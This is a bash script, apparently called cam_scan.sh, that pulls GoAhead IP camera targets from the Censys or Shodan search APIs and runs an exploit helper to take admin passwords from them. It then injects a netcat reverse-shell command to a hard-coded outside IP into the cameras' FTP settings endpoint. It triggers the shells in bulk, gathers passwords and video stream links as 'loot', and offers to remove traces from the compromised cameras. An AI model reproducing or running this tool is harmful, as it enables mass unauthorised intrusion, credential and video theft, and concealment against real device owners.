#!/bin/bash
###################################################
# Installing the following stuff if not on system
# censys_io.py (cp censys_io.py /usr/bin/censys_io.py)
# feh (apt install feh)
# GeoLiteCity.dat (
# wget http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
# gunzip GeoLiteCity.dat.gz
# cp GeoLiteCity.dat /usr/bin/GeoLiteCity.dat
###################################################

#check if tools are there
if [ ! -f '/usr/bin/censys_io.py' ]; then
    #echo "File not found!"
    cp 'censys_io.py' '/usr/bin/censys_io.py'
    echo "censys_io.py copied to /usr/bin/"
fi
if [ ! -f '/usr/bin/GeoLiteCity.dat' ]; then
    #echo "File not found!"
    wget –quiet http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
    gunzip GeoLiteCity.dat.gz
    cp GeoLiteCity.dat /usr/bin/GeoLiteCity.dat
    rm GeoLiteCity.dat.gz && rm GeoLiteCity.dat
    echo "GeoLitCity.dat copied to /usr/bin/"
fi

# set an initial values
Api='list'
Exploit=0
Count=10
Lport=666

#Home sweet home
DIR=$(dirname "${VAR}")
echo "${DIR}"

# read the options
TEMP=`getopt -o a:c:f:i:l:edh --long api:,count:,file:,ip:,lport:,exploit,debug,help -n 'test.sh' -- "$@"`
eval set -- "$TEMP"

# extract options and their arguments into variables.
while true ; do
    case "$1" in
        -h|--help) Help=1 ; shift ;;
        -d|--debug) Debug=1 ; shift ;;
        -e|--exploit) Exploit=1 ; shift ;;
        -a|--api)
            case "$2" in
                "") shift 2 ;;
                *) Api=$2 ; shift 2 ;;
            esac ;;
        -l|--lport)
            case "$2" in
                "") shift 2 ;;
                *) LPort=$2 ; shift 2 ;;
            esac ;;
        -c|--count)
            case "$2" in
                "") shift 2 ;;
                *) Count=$2 ; shift 2 ;;
            esac ;;
        -f|--file)
            case "$2" in
                "") shift 2 ;;
                *) File=$2 ; shift 2 ;;
            esac ;;
        -i|--ip)
            case "$2" in
                "") shift 2 ;;
                *) SingleIp=$2 ; shift 2 ;;
            esac ;;
        --) shift ; break ;;
        *) echo "Internal error!" ; exit 1 ;;
    esac
done

#Instructions
if [[ $Help -eq 1 ]]; then
	echo "Usage :"
	echo " -c/--count <number> 	# how many targets should be pulled from api "
  echo "  -e/--exploit		# run exploit on found targets"
  echo "  -a/--api <number>        # Choose api (0)censys.io (1)shodan.io"
  echo "  -h/--help			# show this help"
	echo "Example :"
	echo " cam_scan.sh --api 0 --count 100 --exploit"
	echo "Files can be found in /root/.Cam_Scan/output/"
	exit
fi

#BUILD file ENV
LootFolderBackup="/root/.CamScan/output_backup"$(date '+%d_%m_%Y_%H_%M')
LootFolder="/root/.CamScan/output"
mkdir -p $LootFolder
LootFolder=$(echo $LootFolder'/')
:> $LootFolder'clean.lst'

#main function
function Main(){

  #set keys and init API shizzle
  CENAPISTRING=$(cat apikey.ini |grep censys |shuf |tail -n 1)
  CENSYS_API=$(echo ${CENAPISTRING} |awk -F ':' '{print $2}')
  CENSYS_SECRET=$(echo ${CENAPISTRING} |awk -F ':' '{print $3}')
  SHODANAPI=$(cat apikey.ini |grep shodan |shuf |tail -n 1|awk -F ':' '{print $2}')
  shw_info "ShoDan " && shodan init "${SHODANAPI}"

  #Get targets
  Get_Targets $Api $Count

  cat $LootFolder'clean.lst' >> $LootFolder'BackupTargets.lst'

  if [[ $Exploit -eq 1 ]]; then
  	shw_info "exploiting!"
  	ExploitList && ReportLoot
    #Listen for shells
    echo -n "Listen for incoming shell on port ${LPort}?(y/n)"
    read answer
    if echo "$answer" | grep -iq "^y" ;then
      echo -n "Extern?(y/n)"
      read answer
      if echo "$answer" | grep -iq "^y" ;then
        xterm -hold -e "nc -l -p ${LPort} -vvv" &
        echo -n "Trigger how many Random cams on port ${LPort}?(default:10)"
      	read answer
        if [[ $answer -eq "" ]]; then
          TriggerRandomFtp 10
        else
          TriggerRandomFtp $answer
        fi
      else
        echo "Start listening"
        command nc -l -p ${LPort} -vvv &
      fi
    fi
  fi

  #Clean The Scene
  echo -n "Remove traces on targets?(y/n)"
  read answer2
  if echo "$answer2" | grep -iq "^y" ;then
  	echo "Removing traces!"
    for i in $(cat $LootFolder'strip.lst'); do
      curl $i --max-time 4 > $LootFolder'deltrace.lst';
    done
    rm $LootFolder'deltrace.lst'
  fi
  echo -n "Clean loot folder?(y/n)"
  read answerclean
  #clean up
  if echo "$answerclean" | grep -iq "^y" ;then
    mkdir -p $LootFolderBackup
    LootFolderBackup=$(echo $LootFolderBackup'/')
  	echo "Cleaning lootfolder Backup in "$LootFolderBackup
    cp -r  $LootFolder  $LootFolderBackup
    rm -r  $LootFolder
    mkdir  $LootFolder

    #Make blanks for needed files
    :>  $LootFolder'strip.lst'
    :>  $LootFolder'deltrace.lst'
    :>  $LootFolder'Data.lst'
  else
    ReportLoot 1
  fi

}

#SCANNER
function Get_Targets(){
  api_engine=$1
  clear
  if echo "$api_engine" | grep -iq "^censys" ;then
    # shooting API
    shw_info "Scraping censys Api..."
    censys_io.py "GoAhead 5ccc069c403ebaf9f0171e9517f40e41" --api_id $CENSYS_API --api_secret $CENSYS_SECRET --tsv --limit $2 -f ip,protocols |awk '{print $1":"$2}' > $LootFolder'Data.lst'
  	#censys_io.py "dgn2200" --api_id $CENSYS_API --api_secret $CENSYS_SECRET --tsv --limit $2 -f ip,protocols |awk '{print $1":"$2}' > $LootFolder'Data.lst'
    
    cat $LootFolder'Data.lst'
    for i in $(cat $LootFolder'Data.lst'); do
      WORDTOREMOVE="\/http"
      i=${i//$WORDTOREMOVE/}
      WORDTOREMOVE="\/cwmp"
      i=${i//$WORDTOREMOVE/}
      echo $i |awk -F ',' '{print $1}' >>  $LootFolder'clean.lst'
    done

    echo "Logged "$Count" of them in : "$LootFolder'clean.lst'

  elif echo "$api_engine" | grep -iq "^shodan" ;then
    #shooting API
    shw_err "Scraping Shodan."
    shodan search 'GoAhead 5ccc069c403ebaf9f0171e9517f40e41' --fields ip_str,port --separator ':' |awk -F ':' '{print $1":"$2}'|head -n -1 |sort -u |head -n $Count > $LootFolder'clean.lst'
    #shodan search 'dgn2200' --fields ip_str,port --separator ':' |awk -F ':' '{print $1":"$2}'|head -n -1 |sort -u |head -n $Count > $LootFolder'clean.lst'
    echo "Logged "$Count" of them in : "$LootFolder'clean.lst'
  
  elif echo "$api_engine" | grep -iq "^single" ;then
    shw_err "Single Ip "
    #echo $SingleIp > $LootFolder'clean.lst'
    echo "using " $SingleIp
    ExploitOne $SingleIp
    
  else
    #list
    #wc -l $File |sort -u
    echo 'list methode'
    cat ${File} |sort -R |head -n $Count > $LootFolder'clean.lst'
  fi
}

#EXPLOITER
function ExploitList(){

  cat $LootFolder'clean.lst' |head -n $Count >  $LootFolder'clean_count_limit_'$Count'.lst'

	command exploit_camera.py \
		-b 2 -l $LootFolder'clean_count_limit_'$Count'.lst' -o $LootFolder'exploit_loot.lst'

	cat $LootFolder'exploit_loot.lst' |grep password >>  $LootFolder'BackupExploitLoot.lst'
cat $LootFolder'exploit_loot.lst'

	get_auth_link

}


function ExploitOne(){
  
  t=$1
	command exploit_camera.py \
    -b 2 -i $t -o $LootFolder'exploit_loot.lst'

  cat $LootFolder'exploit_loot.lst' |grep password >>  $LootFolder'BackupExploitLoot.lst'

  get_auth_link
}

#shell poppin Power
function TriggerRandomFtp(){
  C=$1
  for i in $(cat $LootFolder'camtriggers.lst' |shuf |tail -n $C); do
      echo "$i"
      command curl "$i" --max-time 3 > null
  done
  echo -n "Again?(y/n)"
	read answer
	if echo "$answer" | grep -iq "^y" ;then
    TriggerRandomFtp $C
  fi
}


#DATAHANDLERS
function ReportLoot(){
  if [[ $1 -eq 1 ]]; then
    CLINES=10000
  else
    CLINES=$Count
  fi
  # shw_info "------------------------------------------------------------------------------"
  # cat $LootFolder'strip.lst'|tail -n $Count |sort -u
  	shw_info "------------------------------------------------------------------------------"
  	cat $LootFolder'camstreams.lst' |tail -n $CLINES |sort -u
  	shw_info "------------------------------------------------------------------------------"
  	cat $LootFolder'camtriggers.lst'|tail -n $CLINES |sort -u
  	shw_info "------------------------------------------------------------------------------"
}

function curlshit(){

  if [[ $Debug -eq 1 ]]; then echo "http://"$3":"$4"@"$1":"$2; fi
  #Stage the FTP settings with a nc reverse shell  
 	curl 'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%2082.75.163.96%20'$5'%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0' --max-time 5  > /dev/null
	#Make bullets
  Trigger='http://'$3':'$4'@'$1':'$2'/ftptest.cgi?next_url=test_ftp.htm&loginuse='$3'&loginpas='$4
	#Bullets in chamber
  echo "$Trigger" >>  $LootFolder'camtriggers.lst'
  if [[ $Debug -eq 1 ]]; then echo "$Trigger"; fi
	#Make the direct stream link
  echo 'http://'$3':'$4'@'$1':'$2'/videostream.cgi?loginuse='$3'&loginpas='$4 >> $LootFolder'camstreams.lst'
	#Construct the Cleaning Crew
  echo $(echo  'http://'$3':'$4'@'$1':'$2'/set_ftp.cgi?next_url=ftp.htm&loginuse='$3'&loginpas='$4'&svr=%24(nc%20${LPort}%20-e%20%2Fbin%2Fsh)&port=21&user=ftp&pwd=ftp&dir=/&mode=0&upload_interval=0') >> $LootFolder'strip.lst'

}

function get_auth_link(){

	for i in $(cat $LootFolder'BackupExploitLoot.lst' |sort -u |tail -n $Count); do

		#Filter needs
		IP=$(echo $i |awk -F ',' '{print $1}'|awk -F ':' '{print $2}' )
		PORT=$(echo $i |awk -F ',' '{print $2}'|awk -F ':' '{print $2}' )
		NAME_PASS=$(echo $i |awk -F ',' '{print $3}'|awk -F ':' '{print $2}' )

    #Save passwords
    echo $NAME_PASS >> $LootFolder'passwords.lst'
    cat $LootFolder'passwords.lst' |sort -u > $LootFolder'passwords_clean.lst'
    cat $LootFolder'passwords_clean.lst' > $LootFolder'passwords.lst'
    rm $LootFolder'passwords_clean.lst'

    #Prepping BaCKDoor
		if [[ $IP ]]; then
      if [[ $Exploit -eq 1 ]]; then
    		if [[ $Debug -eq 1 ]]; then 
          echo "HacKinG fTp BaCkDoOr: "$IP":"$PORT":admin:"$NAME_PASS; 
        fi
        #PoNr
			  curlshit $IP $PORT "admin" $NAME_PASS $LPort
      fi
		fi

	done
}

function GetGeoLoc(){
  iplist=$1
  for i in $(cat $iplist |sort -u); do 
    echo $i
      IP=$(echo $i |awk -F ':' '{print $1}')
      PORT=$(echo $i |awk -F ':' '{print $2}')
      echo $IP":" >> ip_geo_loc.lst
    command geoiplookup $IP -f plugins/GeoLiteCity.dat |awk -F ',' '{print $7":"$8}' |tr -d ' ' >> $LootFolder'ip_geo_loc.lst'
  done
  cp $LootFolder'ip_geo_loc.lst' $LootFolder'ip_geo_loc2l.lst'
  perl -pne 'if($.%2){s/\n//;}' $LootFolder'ip_geo_loc2l.lst' > $LootFolder'ip_lat_lon.lst'
  :> $LootFolder'ip_geo_loc.lst'

}
# Rainbow
shw_grey () {
  echo $(tput bold)$(tput setaf 0) $@ $(tput sgr 0)
}
shw_nr1 () {
  echo $(tput bold)$(tput setaf 9) $@ $(tput sgr 0)
}
shw_nr2 () {
  echo $(tput bold)$(tput setaf 8) $@ $(tput sgr 0)
}
shw_nr3 () {
  echo $(tput bold)$(tput setaf 7) $@ $(tput sgr 0)
}
shw_info () {
  echo $(tput bold)$(tput setaf 4) $@ $(tput sgr 0)
}
shw_warn () {
  echo $(tput bold)$(tput setaf 2) $@ $(tput sgr 0)
}
shw_err ()  {
  echo $(tput bold)$(tput setaf 1) $@ $(tput sgr 0)
}

#INIT Script
Main